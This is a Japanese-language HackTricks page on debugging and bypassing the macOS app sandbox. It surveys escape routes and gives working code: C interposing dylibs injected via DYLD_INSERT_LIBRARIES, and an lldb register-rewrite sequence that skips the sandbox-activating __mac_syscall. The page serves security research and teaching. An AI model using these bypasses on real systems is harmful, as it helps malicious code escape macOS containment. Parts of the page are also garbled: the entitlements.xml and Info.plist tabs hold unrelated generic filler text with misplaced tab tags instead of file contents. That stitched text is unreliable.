# macOS Sandbox Debug & Bypass

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**する。
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>

## サンドボックスの読み込みプロセス

<figure><img src="../../../../../.gitbook/assets/image (901).png" alt=""><figcaption><p>画像は<a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a>から</p></figcaption></figure>

前述の画像では、**`com.apple.security.app-sandbox`**権限を持つアプリケーションが実行される際に、**サンドボックスがどのように読み込まれるか**が観察できます。

コンパイラは`/usr/lib/libSystem.B.dylib`をバイナリにリンクします。

その後、**`libSystem.B`**は**`xpc_pipe_routine`**がアプリの権限を**`securityd`**に送信するまで、他のいくつかの関数を呼び出します。Securitydはプロセスがサンドボックス内に隔離されるべきかどうかをチェックし、そうであれば隔離されます。\
最後に、サンドボックスは**`__sandbox_ms`**を呼び出してアクティブ化され、**`__mac_syscall`**が呼び出されます。

## バイパス可能な方法

### 隔離属性のバイパス

**サンドボックス化されたプロセスによって作成されたファイル**には、サンドボックスからの脱出を防ぐために**隔離属性**が追加されます。ただし、サンドボックス化されたアプリケーション内で隔離属性のない`.app`フォルダを作成できれば、アプリバンドルのバイナリを**`/bin/bash`**を指すようにし、**plist**にいくつかの環境変数を追加して**`open`**を悪用して**新しいアプリをサンドボックスをバイパスして起動**することができます。

これは[**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)で行われたことです。

{% hint style="danger" %}
したがって、現時点では、隔離属性のない名前で終わるフォルダを作成できる場合、macOSは**`.app`フォルダ**と**メイン実行可能ファイル**でのみ**隔離**属性を**チェック**するため、サンドボックスを回避できます（メイン実行可能ファイルを**`/bin/bash`**に向けます）。

すでに実行が許可された.appバンドル（許可された実行フラグを持つquarantine xttrを持っている）の場合、それも悪用できます...ただし、今では特権TCC権限（サンドボックス内には持っていない）がない限り、**`.app`**バンドルに書き込むことはできません。
{% endhint %}

### Open機能の悪用

[**Wordサンドボックスバイパスの最後の例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)では、**`open`** cli機能がサンドボックスをバイパスするために悪用される方法が示されています。

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Launch Agents/Daemons

アプリケーションが**サンドボックス化されることが意図されていても**（`com.apple.security.app-sandbox`）、例えばLaunchAgent（`~/Library/LaunchAgents`）から実行される場合は、サンドボックスをバイパスすることが可能です。\
[**この記事**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)で説明されているように、サンドボックス化されたアプリケーションで永続性を得たい場合は、LaunchAgentとして自動的に実行されるようにし、DyLib環境変数を介して悪意のあるコードを注入することができます。

### Auto Start Locationsの悪用

サンドボックス化されたプロセスが**後でサンドボックス化されていないアプリケーションがバイナリを実行する場所に書き込む**ことができる場合、そこにバイナリを配置することで**簡単に脱出**できます。この種の場所の良い例は`~/Library/LaunchAgents`や`/System/Library/LaunchDaemons`です。

これには**2つのステップ**が必要かもしれません：**より許可のあるサンドボックス**（`file-read*`、`file-write*`）を持つプロセスが、実際に**サンドボックスをバイパスして実行される場所に書き込む**コードを実行する必要があります。

**Auto Start locations**に関するこのページをチェックしてください：

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### 他のプロセスの悪用

サンドボックスプロセスから**他のプロセスを妨害**することができれば、より制限の少ないサンドボックス（またはなし）で実行されているプロセスに**脱出**することができます：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### 静的コンパイルと動的リンク

[**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、サンドボックスをバイパスする2つの方法が発見されました。サンドボックスは、**libSystem**ライブラリがロードされるときにユーザーランドから適用されます。バイナリがそのライブラリのロードを回避できれば、サンドボックスを回避できます：

- バイナリが**完全に静的にコンパイル**されている場合、そのライブラリのロードを回避できます。
- バイナリがライブラリをロードする必要がない場合（リンカーもlibSystemにあるため）、libSystemをロードする必要がありません。

### シェルコード

ARM64の**シェルコードでさえ**、`libSystem.dylib`にリンクする必要があります。
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 権限

特定の**権限**がアプリケーションにある場合、**アクション**が**サンドボックスで許可されている**としても、注意してください。
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### インターポスティングバイパス

**インターポスティング**に関する詳細は、以下を参照してください：

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### サンドボックスを回避するために `_libsecinit_initializer` をインターポストする
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### サンドボックスを回避するために`__mac_syscall`をインターポストする

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldbを使用してSandboxのデバッグとバイパス

サンドボックスされるはずのアプリケーションをコンパイルしてみましょう：

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}  

## macOS Sandbox Debug and Bypass

### Introduction

This document outlines techniques to debug and bypass macOS sandbox restrictions for testing and research purposes. Understanding how sandboxing works and how to bypass it is crucial for security researchers and developers.

### Prerequisites

- Basic knowledge of macOS security mechanisms
- Familiarity with Xcode and command line tools
- Understanding of macOS sandbox architecture

### Debugging Techniques

1. **Dynamic Analysis**: Use tools like LLDB to attach to sandboxed processes and inspect runtime behavior.
2. **Static Analysis**: Analyze the sandbox profile (entitlements.xml) to understand the restrictions imposed on the process.
3. **Code Injection**: Inject code into the process to manipulate its behavior and bypass sandbox restrictions.
4. **Environment Variables**: Modify environment variables to alter the process environment and potentially bypass sandbox restrictions.

### Bypass Techniques

1. **Exploiting Vulnerabilities**: Identify and exploit vulnerabilities in macOS or third-party software to escape the sandbox.
2. **Kernel Exploits**: Use kernel exploits to gain higher privileges and bypass sandbox restrictions.
3. **Filesystem Manipulation**: Manipulate filesystem permissions to access restricted resources and bypass sandbox restrictions.
4. **Inter-Process Communication**: Communicate between processes to bypass sandbox restrictions and achieve desired outcomes.

### Conclusion

By understanding macOS sandboxing mechanisms and employing debugging and bypass techniques, security researchers can effectively test the security of macOS applications and contribute to improving overall system security.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %}

## macOS Sandbox デバッグとバイパス

macOS サンドボックスは、アプリケーションが制限された環境で実行されるように設計されています。サンドボックスをバイパスするためには、デバッグ技術を使用する必要があります。サンドボックスをバイパスするための一般的な手法には、デバッグポートの使用、デバッグフラグの設定、およびデバッグツールの使用があります。

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

その後、アプリをコンパイルします：

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
アプリケーションは、**`~/Desktop/del.txt`** ファイルを**読み取ろうとします**が、**Sandbox が許可しない**でしょう。\
Sandbox をバイパスした後に読み取ることができるように、そこにファイルを作成してください：
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

アプリケーションをデバッグして、サンドボックスがいつ読み込まれるかを確認しましょう：
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**サンドボックスをバイパスしても、TCC** はユーザーにデスクトップからファイルを読むプロセスを許可するかどうか尋ねます。
{% endhint %}

## 参考文献

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を使って、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
